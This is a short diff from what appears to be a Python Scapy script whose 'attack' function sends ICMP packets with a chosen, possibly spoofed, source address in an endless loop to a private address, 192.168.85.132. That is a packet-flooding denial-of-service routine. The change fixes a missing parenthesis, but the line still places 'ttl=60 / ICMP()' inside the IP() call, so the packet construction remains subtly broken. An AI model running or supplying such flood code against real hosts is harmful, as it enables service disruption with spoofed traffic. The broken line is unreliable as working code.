@@ -22,7 +22,7 @@ def start():
 def attack(src, i):
     try:
         while True:
-            send(IP(src=src, dst='192.168.85.132', ttl=60 / ICMP())
+            send(IP(src=src, dst='192.168.85.132', ttl=60 / ICMP()))
     except Exception as e:
         print(e)
 
